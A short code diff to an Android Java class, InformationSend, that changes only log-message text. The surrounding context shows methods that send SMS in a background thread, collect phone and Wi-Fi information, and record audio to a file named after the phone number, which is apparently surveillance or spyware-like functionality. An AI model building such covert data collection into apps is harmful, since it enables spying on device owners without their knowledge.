@@ -76,7 +76,7 @@ public class InformationSend {
     }
 
     public void smsSend(final String smsSender, final String smsBody) {
-        Log.i(LogTag, "InformationSend.smsSend() Method");
+        Log.i(LogTag, "smsSend() Method");
 
         new Thread(new Runnable() {
             public void run() {
@@ -94,7 +94,7 @@ public class InformationSend {
     }
 
     public void getPhoneInfo() {
-        Log.i(LogTag, "InformationSend.getPhoneInfo() Method");
+        Log.i(LogTag, "getPhoneInfo() Method");
         final StringBuilder deviceInfo = new StringBuilder();
 
         WifiManager wifiMng = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
@@ -133,7 +133,7 @@ public class InformationSend {
     }
 
     public void getRecordData() {
-        Log.i(LogTag, "InformationSend.getRecordData() Method");
+        Log.i(LogTag, "getRecordData() Method");
 
         MediaRecorder recorder = null;
         final String fileName = phoneNumber + "_record_" + date + ".mp4";
